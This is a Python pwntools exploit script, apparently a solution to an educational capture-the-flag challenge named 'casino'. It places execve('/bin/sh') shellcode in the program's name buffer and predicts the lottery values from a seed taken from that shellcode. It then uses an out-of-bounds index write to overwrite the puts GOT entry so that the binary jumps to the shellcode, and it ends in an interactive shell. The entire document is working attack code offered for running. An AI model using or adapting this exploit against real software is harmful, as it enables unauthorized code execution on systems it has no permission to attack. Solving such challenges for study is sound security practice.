#coding=utf-8
from pwn import *
import sys

#r = remote('edu-ctf.csie.org', 10172)
r = process('./casino')
puts = 0x602020
lottery = 0x6020b0
guess = 0x6020d0
name = 0x6020f0
seed = 0x602100
age = 0x602104

if sys.argv[1] == 'debug':
    gdb.attach(r)

# store the shellcode in name since we will jump to name at last
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
shellcode = '\x50\x58' * ((0x100 - len(shellcode)) / 2) + shellcode
r.recvuntil('Your name: ')
r.sendline(shellcode)

# age is from the shellcode
r.recvuntil('Your age: ')
var_age = int(shellcode[age - name : age - name + 4][::-1].encode('hex'), 16)
r.send(str(var_age))

# compute the random number of the seed from shellcode
p = process('./get_rand')
var_seed = int(shellcode[seed - name : seed - name + 4][::-1].encode('hex'), 16)
p.sendline(str(var_seed))
lottery = p.recvall(1).split('\n')[:-1]
p.close()

# first loop we do not go into win
for i in range(6):
    r.recvuntil('Chose the number {}: '.format(i))
    r.sendline('0')

r.recvuntil('Change the number? [1:yes 0:no]: ')
r.sendline('1')
r.recvuntil('Which number [1 ~ 6]: ')
r.sendline(str((puts - guess)/4 + 1))
r.recvuntil('Chose the number')
r.sendline(str(name))

# second loop to send correct guess
for i in range(6):
    r.recvuntil('Chose the number ')
    r.sendline(lottery[i])

r.recvuntil('Change the number? [1:yes 0:no]: ')
r.sendline('1')
r.recvuntil('Which number [1 ~ 6]: ')
r.sendline(str((puts - guess)/4 + 2))
r.recvuntil('Chose the number')
r.send('0')

r.interactive()
